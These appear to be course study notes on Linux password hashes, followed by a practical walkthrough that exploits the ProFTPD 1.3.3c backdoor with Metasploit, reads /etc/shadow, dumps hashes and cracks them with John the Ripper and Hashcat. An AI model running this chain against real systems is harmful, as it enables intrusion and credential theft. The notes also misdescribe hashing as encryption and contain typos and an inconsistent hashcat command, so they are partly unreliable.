## Linux password hashes
* Linux has a multi-user support --> Advantage and disadvantage at the same time from a security perspective as multiple accounts offer multiple acces vectors.

* **Where is all the information for all accounts stored on a Linux system?**
  * `/etc/passwd`
 
* **Why we can't see the passwords stored in this passwd file?**
  * As this file is readable by any user on the system, it is encrypted
 
* **Where are all th eencrypted passwords stored?**
  * `/etc/shadow`
 
* **Who can access the shadow file?**
  * Only the root account
 
* PRACTICAL
* `searchsploit proftpd`
* `service postgresql start && msfconsole`
* `setg rhosts [target IP]`
* `use exploit/unix/ftp/proftpd_133c_backdoor`
* `exploit`  --> command shell session+
* `/bin/bash -i`
* `cat /etc/shadow` --> We need to decrypt these hashed values
* We'll put this command shell to the background
* `sessions -u 1` --> to get a meterpreter session
* `use post/linux/gather/hashdump`
* `set session 2`
* `run`
* Copy the path of unshadowed file and its value after 'cat' this path.
* `exit -y`
* `gzip -d /usr/share/wirdlists/rockyou.txt.gz`

* **Cracking with John The Ripper**
  * `john --format=sha512crypt [path copied above to the unshadowed file] --wordlist=/usr/share/wordlists/rockyou.txt`

* **Doing the same thing with Hashcat**
  * hashcat --help | grep 1800 --> 1800 corresponding to sha512 algorithm
  * `hashcat -a3 -m 1800 [path to the unshadowed file] /usr/share/wordlists/rockyou/txt`  : where -m is Hash mode
